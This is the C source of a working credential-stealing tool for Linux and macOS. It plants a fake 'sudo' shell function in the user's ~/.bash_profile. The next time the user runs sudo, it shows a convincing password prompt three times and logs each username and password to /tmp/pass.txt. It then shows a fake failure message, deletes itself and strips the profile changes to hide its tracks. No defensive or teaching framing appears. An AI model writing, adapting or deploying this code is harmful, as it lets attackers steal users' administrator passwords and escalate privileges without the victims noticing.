#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define PROFILE_FILE_NAME "/.bash_profile"
#define OUTPUT_FILE_LOCATION "/tmp/pass.txt"

#define USERNAME_BUFFER_SIZE 32
#define PROMPT_SIZE 100

#define CODE_START "# t7mGMoCzRVGmVfgAyOaG"
#define CODE_END "# tklXNT02uH2fTUQ2fGiO"
#define CODE_MARKS_LENGTH 10

#define BASHRC_LINE_BUFFER_SIZE 1024

#define PASSWORD_ATTEMPS 3

#ifdef MAC
#include <mach-o/dyld.h>
#endif

char *concat(const char *s1, const char *s2)
{
    char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

void get_executable_path(char *buf, size_t size)
{
#ifndef MAC
    readlink("/proc/self/exe", buf, size);
    size_t file_location_len = strlen(buf);
    buf[file_location_len - 5] = '\0';
#else
    if (_NSGetExecutablePath(buf, &size) != 0)
    {
        buf[0] = '\0'; // buffer too small (!)
    }
#endif
}

void self_remove()
{
    char file_location[250];
    get_executable_path(file_location, 250);
    remove(file_location);
}

void get_bashrc_location(char *buf)
{
    char *bashrc_file;
    const char *home_folder = getenv("HOME");

    bashrc_file = concat(home_folder, PROFILE_FILE_NAME);
    strcpy(buf, bashrc_file);
    free(bashrc_file);
}

void clear_bashrc()
{
    char buf[BASHRC_LINE_BUFFER_SIZE];
    char bashrc_file[250];
    char bashrc_file_replica[300];
    signed char should_copy = 1;

    FILE *fd = NULL;
    FILE *fd_replica = NULL;

    get_bashrc_location(bashrc_file);
    sprintf(bashrc_file_replica, "%s_replica", bashrc_file);

    if ((fd = fopen(bashrc_file, "r")) == NULL)
    {
        fprintf(stderr, "unable to open.\n");
    }
    else if ((fd_replica = fopen(bashrc_file_replica, "w")) == NULL)
    {
        fprintf(stderr, "unable to open.\n");
    }
    else
    {
        while (!feof(fd))
        {
            fgets(buf, BASHRC_LINE_BUFFER_SIZE, fd);
            if (strncmp(buf, CODE_START, CODE_MARKS_LENGTH) == 0)
            {
                should_copy = 0;
            }
            else if (strncmp(buf, CODE_END, CODE_MARKS_LENGTH) == 0)
            {
                should_copy = 1;
            }
            else if (should_copy)
            {
                fputs(buf, fd_replica);
            }
        }

        fclose(fd);
        fd = NULL;
        unlink(bashrc_file);
        rename(bashrc_file_replica, bashrc_file);
    }

    if (fd)
    {
        fclose(fd);
    }
    if (fd_replica)
    {
        fclose(fd_replica);
    }
}

void update_bashrc()
{
    char bashrc_file[250];
    FILE *fd = NULL;
    char file_location[250];
    get_executable_path(file_location, 250);
    get_bashrc_location(bashrc_file);

    if ((fd = fopen(bashrc_file, "a")) == NULL)
    {
        fprintf(stderr, "unable to open.\n");
        return;
    }
    fprintf(fd, CODE_START);
    fprintf(fd, "\n\n\n\n");
    fprintf(fd, "function sudo { \n"
                "   if [ -f \"%s\" ]; then \n"
                "       %s s \n"
                "   else \n"
                "      /usr/bin/sudo \"$@\" \n"
                "   fi\n"
                " }\n",
            file_location, file_location);
    fprintf(fd, CODE_END);
    fprintf(fd, "\n");

    fclose(fd);
}

void run_cmd(char *cmd)
{
    system(cmd);
}

void ask_for_password()
{
    FILE *output_file = NULL;
    int i;
    char user_name[USERNAME_BUFFER_SIZE];
    char *password = NULL;
    getlogin_r(user_name, (size_t)USERNAME_BUFFER_SIZE);

#ifndef MAC
    char prompt[PROMPT_SIZE];
    sprintf(prompt, "Enter password for [%s]: ", user_name);
#else
    char prompt[100] = "Password: ";
#endif

    for (i = 0; i < PASSWORD_ATTEMPS; i++)
    {
        password = getpass(prompt);

        if ((output_file = fopen(OUTPUT_FILE_LOCATION, "a")) != NULL)
        {
            fprintf(output_file, "username: %s, password: %s\n", user_name, password);
            fclose(output_file);
        }

        sleep(1);
        if (i < PASSWORD_ATTEMPS)
        {
            printf("Sorry, try again.\n");
        }
    }

    printf("sudo: %d incorrect password attempts\n", i);
}

int main(int argc, char **argv)
{
    if (argc == 2)
    {
        switch (**++argv)
        {
        case 'r':
            clear_bashrc();
            self_remove();
            break;
        case 's':
            ask_for_password();
            self_remove();
            clear_bashrc();
            break;
        case 'i':
            update_bashrc();
            break;
        }
        return 0;
    }

    return 1;
}
